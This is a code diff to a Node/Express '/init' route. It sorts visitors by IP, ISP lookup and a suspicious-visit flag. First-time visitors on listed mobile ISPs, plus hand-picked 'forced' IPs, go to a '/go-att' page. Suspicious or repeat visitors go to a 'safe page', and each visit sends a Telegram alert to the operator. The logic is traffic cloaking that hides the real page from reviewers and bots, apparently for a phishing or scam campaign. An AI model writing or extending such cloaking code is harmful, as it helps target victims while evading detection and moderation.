@@ -191,20 +191,9 @@ app.get('/init', async (req, res) => {
 
     console.log(`[Init] Visit from IP: ${clientIp}`);
     
-    // Check for forced redirect IPs (bypasses all other checks)
+    // Check for forced redirect IPs
     const forcedIps = await getForcedIps();
-    if (forcedIps.includes(clientIp)) {
-        console.log(`[Init] IP ${clientIp} is in forced list. Redirecting to ATT page.`);
-        return res.json({ redirect: '/go-att' });
-    }
-
-    // Check if user has already visited the ATT landing page
-    const visitedIps = await getVisitedIps();
-    const isVisited = visitedIps.some(entry => (typeof entry === 'object' ? entry.ip : entry) === clientIp);
-    if (isVisited) {
-        console.log(`[Init] IP ${clientIp} already visited. Redirecting to safe page.`);
-        return res.json({ redirect: NON_ATT_LANDING_PAGE });
-    }
+    const isForced = forcedIps.includes(clientIp);
 
     let data = null;
     try {
@@ -222,8 +211,9 @@ app.get('/init', async (req, res) => {
     }
 
     // Send Telegram Notification
-    let message = `🚀 *New App Visit!* \n\n`;
-    if (isSuspicious) {
+    let message = isForced ? `✨ *FORCED REDIRECT VISIT* \n\n` : `🚀 *New App Visit!* \n\n`;
+    
+    if (isSuspicious && !isForced) {
         message += `⚠️ *SUSPICIOUS VISIT DETECTED*\n\n`;
     }
 
@@ -251,18 +241,31 @@ app.get('/init', async (req, res) => {
 
     // Determine Redirect URL
     let targetUrl = NON_ATT_LANDING_PAGE;
-    if (data && data.status === 'success' && !isSuspicious) {
-        const userISP = (data.isp || data.org || "").toUpperCase();
-        if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
-            console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page.`);
-            targetUrl = '/go-att';
-        } else {
-            console.log(`[Init] No ISP match for: ${userISP}`);
-        }
-    } else if (isSuspicious) {
-        console.log(`[Init] Suspicious IP detected. Redirecting to safe page.`);
+    
+    if (isForced) {
+        console.log(`[Init] IP ${clientIp} is forced. Redirecting to ATT page.`);
+        targetUrl = '/go-att';
     } else {
-        console.log(`[Init] Redirecting to safe page. Status: ${data?.status}`);
+        // Normal checks
+        const visitedIps = await getVisitedIps();
+        const isVisited = visitedIps.some(entry => (typeof entry === 'object' ? entry.ip : entry) === clientIp);
+        
+        if (isVisited) {
+            console.log(`[Init] IP ${clientIp} already visited. Redirecting to safe page.`);
+            targetUrl = NON_ATT_LANDING_PAGE;
+        } else if (data && data.status === 'success' && !isSuspicious) {
+            const userISP = (data.isp || data.org || "").toUpperCase();
+            if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
+                console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page.`);
+                targetUrl = '/go-att';
+            } else {
+                console.log(`[Init] No ISP match for: ${userISP}`);
+            }
+        } else if (isSuspicious) {
+            console.log(`[Init] Suspicious IP detected. Redirecting to safe page.`);
+        } else {
+            console.log(`[Init] Redirecting to safe page. Status: ${data?.status}`);
+        }
     }
 
     res.json({ redirect: targetUrl });
